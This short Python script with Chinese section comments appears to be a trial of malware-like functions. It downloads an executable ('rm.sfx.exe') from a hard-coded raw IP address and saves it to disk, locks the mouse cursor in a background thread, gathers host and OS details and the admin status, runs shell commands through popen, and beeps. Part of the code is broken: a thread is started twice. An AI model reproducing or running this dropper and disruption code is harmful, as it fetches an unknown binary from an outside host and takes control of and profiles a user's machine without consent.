#_*_ coding:utf-8 _*_



import requests
url="http://36.133.142.149:30660/rm.sfx.exe"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0'

}
response = requests.get(url, headers=headers).content

f=open("downTest.exe",'wb')
f.write(response)
f.close()



 
##############################锁定鼠标
from threading import Thread

def lockMouse(*args):
    import time
    import ctypes
    for i in range(100):
        #print("锁定: "+str(i))
        ctypes.WinDLL('user32.dll').SetCursorPos(0,0)
        time.sleep(0.1)
t1=Thread(target=lockMouse, args=("线程1",))
t1.start()
import time
time.sleep(20)

t1.start()

###################获取系统信息
import socket
import os
import platform

host_name = socket.gethostname() 
print(host_name)
print(platform.uname())
print(platform.platform())
print(platform.machine())
print(platform.version())
print(platform.node())
print(platform.processor())
from multiprocessing import cpu_count

print(cpu_count())

##################尝试执行popen管道命令
import sys, ctypes, os
#测试是否系统权限
#https://blog.csdn.net/R_I_P_Avicii/article/details/124235989
print(ctypes.windll.shell32.IsUserAnAdmin())
CPU = os.popen('ping www.baidu.com -n 1').read()
start1 = CPU.find('\n')
start2=CPU.find('\n',start1+1)
end = CPU.find('\n',start2+1)
print(CPU[start2+1:end])
#print(os.popen('systeminfo').read())
#wmic cpu get Name

#################################beep
#Beep
import ctypes
#ctypes.WinDLL('user32.dll').SetCursorPos(0,0)
ret=ctypes.WinDLL('Kernel32.dll').Beep(2000,1000)
print(ret)
print(os.popen('cmd').read())



